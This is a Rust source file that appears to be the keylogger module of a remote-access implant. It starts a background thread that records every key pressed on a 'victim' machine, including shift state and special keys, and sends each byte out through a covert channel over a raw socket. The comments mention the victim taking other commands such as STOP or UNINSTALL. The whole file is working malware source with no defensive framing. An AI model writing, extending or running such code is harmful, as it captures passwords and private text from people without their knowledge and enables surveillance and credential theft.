use rdev::{listen, EventType, Key};
use crate::covert::CovertChannel;
use std::thread;
use std::time::Duration;
use std::sync::{Arc, Mutex};

pub fn start(channel: Arc<Mutex<CovertChannel>>) {
    // Spawn the listener in a background thread so the victim can still receive 
    // other commands (like STOP or UNINSTALL) while the logger runs.
    thread::spawn(move || {
        let mut shift_pressed = false;

        println!("[*] Keylogger background thread started.");

        if let Err(error) = listen(move |event| {
            match event.event_type {
                EventType::KeyPress(key) => {
                    // Lock the channel only when we have a key to send
                    let mut chan = channel.lock().unwrap();

                    match key {
                        Key::ShiftLeft | Key::ShiftRight => shift_pressed = true,
                        Key::Return => chan.send_byte(b'\n'),
                        Key::Space => chan.send_byte(b' '),
                        Key::Backspace => chan.send_byte(0x08), 
                        Key::Tab => chan.send_byte(b'\t'),
                        
                        _ => {
                            let key_repr = format!("{:?}", key);
                            // If it's a single character key (like KeyA)
                            if key_repr.starts_with("Key") && key_repr.len() == 4 {
                                let mut c = key_repr.as_bytes()[3]; 
                                if !shift_pressed {
                                    c = c.to_ascii_lowercase();
                                }
                                chan.send_byte(c);
                            } else {
                                // For things like F1, Esc, etc.
                                let meta = format!("[{:?}]", key);
                                for byte in meta.as_bytes() {
                                    chan.send_byte(*byte);
                                    // Throttle so the raw socket doesn't drop bytes
                                    thread::sleep(Duration::from_millis(5));
                                }
                            }
                        }
                    }
                }
                EventType::KeyRelease(key) => {
                    match key {
                        Key::ShiftLeft | Key::ShiftRight => shift_pressed = false,
                        _ => {}
                    }
                }
                _ => {}
            }
        }) {
            eprintln!("[!] Keylogger Error: {:?}", error);
        }
    });
}
